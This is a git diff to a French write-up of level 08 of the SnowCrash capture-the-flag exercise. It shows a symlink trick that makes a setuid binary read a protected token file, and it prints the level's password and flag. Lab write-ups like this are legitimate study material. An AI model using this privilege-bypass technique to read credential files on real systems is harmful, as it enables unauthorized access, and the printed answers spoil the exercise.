@@ -1,6 +1,6 @@
 # LEVEL 08
 
-- On commence par regarder ce qu'on a avec `ls -la` \
+- On commence par regarder ce qu'on a avec `ls -l` \
 Resultats:
 ```
 total 16
@@ -138,20 +138,14 @@ exit(1 <unfinished ...>
 On voit qu'on essaye de printer un token mais qu'on n'a pas les droits, on decide de creer un fichier pour lequel nous avons les droits, rajouter un lien symbolique dessus qui pointe sur token, pour bypass le probleme d'acces et afficher le token:
 
 ```
-touch /var/crash/yooo
 ln -s /home/user/level08/token /var/crash/yooo
 ./level08 /var/crash/yooo
 ```
 result:
 `quif5eloekouj29ke0vouxean`
 
-
-```
-level08@SnowCrash:~$ su flag08
-Password:
-Don't forget to launch getflag !
-flag08@SnowCrash:~$ getflag
-Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
-```
 ## 🔥 Password
 `quif5eloekouj29ke0vouxean`
+
+## ⚡ Flag
+`25749xKZ8L7DkSCwJkT9dyv6f`
